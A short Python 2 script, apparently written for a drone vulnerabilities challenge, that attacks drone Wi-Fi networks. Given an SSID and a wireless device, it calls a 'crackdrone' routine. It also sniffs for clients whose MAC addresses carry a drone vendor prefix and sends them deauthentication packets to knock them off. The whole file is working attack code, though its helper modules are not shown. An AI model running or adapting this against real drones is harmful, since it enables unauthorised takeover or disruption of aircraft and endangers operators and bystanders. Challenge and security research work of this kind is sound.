import sys
import time
import commands
from environment import Environment


############################################################
### AUTHOR: Jeremy Smith
### LICENSE: GNU GPL
### Written for OpenWERX Drone Vulnerabilities Challenge
############################################################


def main():
    
    env = None

    try:   
        ssid = sys.argv[1]
        device = sys.argv[2]
        env = Environment(device, ssid, v=True)
    except IndexError:
        print 'Proper usage: python ddrone.py {ssid} {wireless device}'
        
    if env:
        env.crackdrone(0)
        
    
def findclients(ssid, device):
    """refactor me"""

    commands.sniffssid(device, ssid)

    for x in range(3):
        print 'sniffing...'
        time.sleep(10)
    
    targets = []
    with open('output-01.csv', 'r') as f:
        for line in f.readlines():
            if '60:60:1F' in line:
                split = line.split(',')
                targets.append([split[-2].strip(), split[0].strip()])

    for target in targets:
        deauthclient(target[0], target[1], device)
    # parse client and access point MAC addresses


def deauthclient(ap, client, device, packets=10):

    out = commands.deauth(ap, client, device, packets)
    if out.stdout.read(): print 'ERROR OCCURED:\n' + out.stdout.read()


if __name__ == '__main__':
    main()
